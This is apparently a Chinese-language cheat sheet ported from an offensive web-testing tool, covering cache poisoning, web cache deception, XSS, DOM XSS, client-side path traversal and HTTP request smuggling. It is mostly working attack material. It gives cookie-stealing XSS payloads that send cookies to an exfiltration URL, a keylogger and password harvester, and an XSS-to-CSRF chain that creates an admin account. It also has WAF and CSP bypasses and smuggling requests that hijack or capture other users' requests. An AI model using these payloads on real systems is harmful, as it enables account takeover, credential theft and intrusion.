# Cache / XSS / DOM / Smuggling — 从 bingo v7.0.66 移植 (cache_poison.py + web_cache_deception.py + xss_exploiter.py + dom_xss_scanner.py + smuggling_*.py)

## 1. 缓存投毒 (cache_poison.py)

### 1.1 未键控 Header 字典 (14个)
```
X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto, X-Original-URL,
X-Rewrite-URL, X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded,
X-Forwarded-Port, X-Original-Host, X-Amz-Cf-Id, CF-Connecting-IP, True-Client-IP
```

### 1.2 两段式验证 (关键 — 判定"真被缓存"而非"仅反射")
```
① 投毒请求: 注入 header (X-Forwarded-Host: evil.attacker.com) → 响应反射 marker
② 干净重放: 用正常 header 再发一次 → 若 marker 仍出现 = 缓存已污染 (CRITICAL confirmed)
```

### 1.3 Fat GET
```
GET 带 body: x=1&admin=true&debug=true → 响应出现 admin/debug = 缓存键不含 body
```

### 1.4 缓存欺骗后缀
```
/account/profile.css  /account/info.jpg  /account/data.js  /dashboard/user.png
/api/user.json.css  /profile/me.ico
```

### 1.5 缓存指示头
```
x-cache: hit | cf-cache-status: hit | age: (非0即hit) | via: | x-varnish
CACHE_HIT:  hit cached tcp_hit mem_hit disk_hit stale revalidated
CACHE_MISS: miss expired bypass dynamic tcp_miss
```

## 2. Web Cache Deception + SameSite Lax 绕过 (web_cache_deception.py)

### 2.1 判定链 (三条件齐才 Critical)
```
cacheable (Cache-Control 无 private 且无 no-store) AND has_sensitive_data AND (cache_confirmed OR cache_hit)
```
注意: 只看 private/no-store 两个词，忽略 no-cache/max-age — CDN 可能无视上游 CC。

### 2.2 缓存确认 (MD5 cache buster)
```
url + "?cb=" + md5(timestamp)[:8] → 第一请求 MISS → 第二请求同 URL 若 HIT = 被缓存
```

### 2.3 SameSite Lax 绕过核心 (HackerOne $2000, tinopreter)
```
原理: <img>/XHR/fetch 是 cross-site subresource (带 Cookie 被阻断)
     <meta http-equiv="refresh"> 是 top-level navigation (Lax 允许带 Cookie)
攻击页: <meta http-equiv="refresh" content="0; url={TARGET}?cb={BUSTER}">
→ 受害者被强制导航 → 认证响应被缓存到 cache-buster URL → 攻击者拉取
SameSite 判定: samesite=strict→Strict / lax→Lax / none→None / 未指定→Lax (浏览器默认)
```

### 2.4 缓存头 12 个
```
x-cache, cf-cache-status, x-cache-status, x-cache-hits, age, x-varnish,
x-cdn-cached, x-proxy-cache, x-nginx-cache, x-fastly-cache, surrogate-key, cdn-cache-control
```

### 2.5 敏感数据正则 (9类)
```python
jwt:         r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
bearer:      r'Bearer\s+[A-Za-z0-9\-._~+/]+=*'
api_key:     r'(?:api[_-]?key|apikey|api_token)\s*[:=]\s*["\']?([A-Za-z0-9\-._]{16,})'
session:     r'(?:session[_-]?(?:id|token)|sess(?:ion)?_id)\s*[:=]\s*["\']?([A-Za-z0-9\-]{16,})'
access:      r'(?:access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']?([A-Za-z0-9\-._]{16,})'
email:       r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'
user_id:     r'(?:user[_-]?id|userId|uid)\s*[:=]\s*["\']?(\d{3,})'
credit_card: r'\b(?:\d[ -]?){13,16}\b'
private_key: r'-----BEGIN (?:RSA )?PRIVATE KEY-----'
```

## 3. XSS 利用器 (xss_exploiter.py)

### 3.1 上下文检测 (marker 注入后三态)
```
"marker" 或 'marker' → attr 上下文
>marker< 或 >marker → html 上下文
var x = "marker → js 上下文
```

### 3.2 Cookie 窃取 payload 全族 (E = exfil_url)
```html
<!-- img onerror -->
<img src=x onerror="fetch('E?c='+document.cookie)">
<img src=x onerror="new Image().src='E?c='+btoa(document.cookie)">
<img src=x onerror=this.src='E?x='+document.cookie>
<!-- svg onload -->
<svg onload="fetch('E?c='+encodeURIComponent(document.cookie))">
<svg/onload=fetch('E?'+btoa(document.cookie))>
<!-- script -->
<script>fetch("E?c="+document.cookie)</script>
<script>var i=new Image();i.src="E?x="+btoa(document.cookie)</script>
<script>document.location="E?c="+document.cookie</script>
<!-- iframe srcdoc 转义 -->
<iframe srcdoc="&lt;script&gt;fetch(&quot;E?c=&quot;+document.cookie)&lt;/script&gt;"></iframe>
<!-- attr 上下文 -->
" onmouseover="fetch('E?c='+document.cookie)" x="
" onfocus="fetch('E?c='+document.cookie)" autofocus x="
' onmouseover='fetch("E?c="+document.cookie)' x='
<!-- js 上下文 -->
';fetch('E?c='+document.cookie)//
";fetch("E?c="+document.cookie)//
`};fetch('E?c='+document.cookie)//
```

### 3.3 CSP 绕过
```html
<!-- JSONP 端点 -->
<script src="{jsonp_url}?callback=fetch('E?c='+document.cookie)//"></script>
<!-- 可信域 Angular sandbox -->
<script src="https://{trusted}/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('fetch("E?c="+document.cookie)')()}}</div>
```

### 3.4 Keylogger 注入
```js
var _kl="";document.addEventListener("keypress",function(e){_kl+=String.fromCharCode(e.which||e.keyCode);
if(_kl.length%20==0)fetch("E?k="+btoa(_kl));});
document.addEventListener("submit",function(){var d=new FormData(this);var s="";
d.forEach(function(v,k){s+=k+"="+v+"&"});fetch("E?form="+btoa(s));},true);
```
password_harvester: `setInterval(...querySelectorAll("input[type=password]")...fetch("E?p="+btoa(el.name+"="+el.value)),2000)`

### 3.5 Stored XSS → CSRF 链 (加管理员/改密码)
```js
// 加管理员
fetch("{csrf_target}",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},
credentials:"include",body:"username=hacker&password=hacked123&role=admin"})
.then(r=>r.text()).then(t=>fetch("E?r="+btoa(t)))
// 包装: <img src=x onerror="{js}"> / <svg onload="{js}">
// CSRF token 先读后 POST
fetch("{page}",{credentials:"include"}).then(r=>r.text()).then(h=>{
var p=new DOMParser();var d=p.parseFromString(h,"text/html");
var t=d.querySelector("input[name=csrf_token]");
if(t)fetch("{post_url}",{method:"POST",headers:{...},credentials:"include",
body:"csrf_token="+t.value+"&admin_action=add_user"})})
```

### 3.6 22 种 XSS 高级 payload (xss_advanced_test)
```
<ScRiPt>alert(1)</ScRiPt>  <script>alert`1`</script>  jaVasCript:alert(1)
%3Cscript%3Ealert(1)%3C%2Fscript%3E  <img src=x onerror=alert(1)>
<svg/onload=alert(1)>  <details open ontoggle=alert(1)>
<body onpageshow=alert(1)>  <input autofocus onfocus=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<table><td><s>X</td></table><img src=x onerror=alert(1)>
{{constructor.constructor('alert(1)')()}}  (Angular)
{{_c.constructor('alert(1)')()}}  (Vue)
<meta http-equiv=refresh content='0;url=javascript:alert(1)'>
<link rel=prefetch href=//attacker.com/steal?c=+document.cookie>
<script type=importmap>{"imports":{"x":"data:text/javascript,alert(1)"}}</script>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=onmouseover value=alert(1)>
<form action=javascript:alert(1)><input type=submit>
<x accesskey=x onclick=alert(1)>X</x>
```

## 4. CSPT (Client-Side Path Traversal) + Cloudflare 2026 绕过 (cspt_waf_bypass.py)

### 4.1 CSPT JS 模式 (8条)
```
fetch( + location.pathname/hash/href
axios.xxx( + location.pathname/hash
useParams/route.params → fetch|axios|http.get (200字符窗口)
baseURL|apiUrl|endpoint + id|path|slug|params|segment
`...${location.pathname|params.x}...` 模板串
router.query.x → fetch|axios (Next.js)
this.http.get(...route.snapshot (Angular)
this.$route.params|query → axios (Vue)
```

### 4.2 CSPT 测试路径
```
/../  /../../  /%2f..%2f  /%2f..%2f..%2f  /..%2f  /..%2F  /%2e%2e/
/%2e%2e%2f  /%252e%252e/  /%252f..%252f  /\u002e\u002e/  /../%00
/../admin  /../api/admin  /../api/users  /../api/config  /../etc/passwd
```

### 4.3 Cloudflare WAF XSS 绕过 2026 payload (Bug Bytes #235)
```html
<!-- CSS Containment API (2026-04 新事件, 绕过 CF 过滤器) -->
<div oncontentvisibilityautostatechange=alert(document.domain) style=content-visibility:auto>
<!-- 其他事件 -->
<div onanimationstart=alert(1) style=animation-name:x>
<div ontransitionend=alert(1) style=transition:all .1s>
<img src=x ondragstart=alert(1)>
<div onpointerdown=alert(1)>click
<a href=x onauxclick=alert(1)>middle-click me</a>  (绕过 clickjacking 防御)
<!-- mXSS -->
<!--><img src=x onerror=alert(1)>
```

### 4.4 多 Content-Type 探测 (12种)
```
application/json, application/xml, text/xml, application/x-www-form-urlencoded,
multipart/form-data, text/plain, application/cbor, application/msgpack,
application/vnd.api+json, application/graphql, application/x-ndjson, text/csv, application/x-yaml
```

## 5. DOM XSS (dom_xss_scanner.py)

### 5.1 SOURCES (14条)
```
location.hash | location.search | location.href | document.URL | document.documentURI
document.referrer | window.name | document.cookie | localStorage.getItem
sessionStorage.getItem | history.state | postMessage | URLSearchParams | new URL(
```

### 5.2 SINKS (19条)
```
.innerHTML= | .outerHTML= | document.write( | document.writeln( | eval( | setTimeout('|
setInterval('| | new Function( | location.href= | location.assign( | location.replace(
.src= | .action= | insertAdjacentHTML( | jQuery.parseHTML( | $(...).html( | angular.element
React.createElement(...dangerouslySetInnerHTML | v-html=
```
(±5 行窗口: source 与 sink 不同行但邻近 5 行内也算命中)

### 5.3 脆弱库版本
```
jquery-1.[0-8]. → jQuery<1.9 .html() XSS
angular.js 1.[0-5]. → AngularJS<1.6 sandbox escape
bootstrap-3.[0-3]. → tooltip XSS
dompurify-1. → DOMPurify<2.0 bypass
```

### 5.4 DOM payload
```
hash:   #<img src=x onerror=alert(1)>  #javascript:alert(1)  #<svg onload=alert(1)>
search: ?q=<img src=x onerror=alert(1)>  ?redirect=javascript:alert(1)
postmessage: {"type":"html","data":"<img src=x onerror=alert(1)>"}
```

## 6. HTTP 走私 (smuggling_scanner + smuggling_exploiter)

### 6.1 CL.TE 探测 (单连接+Connection: close, 判定用异常)
```
POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Connection: close

0

G
```
判定: 400 / "Invalid request" / elapsed>5s

### 6.2 TE.CL 探测 (10字节饥饿窗口)
```
body = "5c\r\nSMUGGLED\r\n0\r\n\r\n"   # len=20
CL = 30 (比实际大10) + TE: chunked
判定: elapsed > 8s (back 等剩余字节挂起)
```

### 6.3 TE.TE 变体 (6+8种合并去重)
```
xchunked | " chunked"(值前空格) | chunked\r\nTransfer-Encoding: x | CHUNKED
chunked\t | X-Transfer-Encoding: chunked | identity | chunked\r
判定: status 不在 (400,500,0) 即命中 (正常服务器对双TE报400)
```

### 6.4 CL.TE poison (劫持下一请求)
```
smuggled = "GET /admin HTTP/1.1\r\nFoo: x\r\nContent-Length: 100\r\n\r\n"
chunk = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
CL = len(chunk), TE: chunked
```

### 6.5 管理请求捕获 (AdminRequestCapture, CL=850)
```
smuggled = "POST {capture} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 850\r\n\r\n"
→ 下一请求落入 capture POST 的 body 中
```

### 6.6 走私注入提权头
```
X-Forwarded-For: 127.0.0.1 | X-Admin: true | X-Internal: true | X-Real-IP: 127.0.0.1
```

### 6.7 sqli_request_smuggling (CL.TE + SQLi)
```
外层: CL=0 + TE: chunked → WAF 认为空 body 放行
内层: chunked body 携带 SQLi → 后端按 TE 解析执行
```

## 7. 实战要点

- 缓存判定永远用两段式 (投毒→干净重放)，单次反射不算缓存漏洞
- WCD 三条件: cacheable + 敏感数据 + 缓存确认，缺一不可
- SameSite Lax 绕过用 meta-refresh，不用 img/fetch
- 走私探测用单连接+close，判定用超时/异常而非响应内容 (干净安全)
- DOM XSS 静态分析用 ±5 行窗口，性价比最高
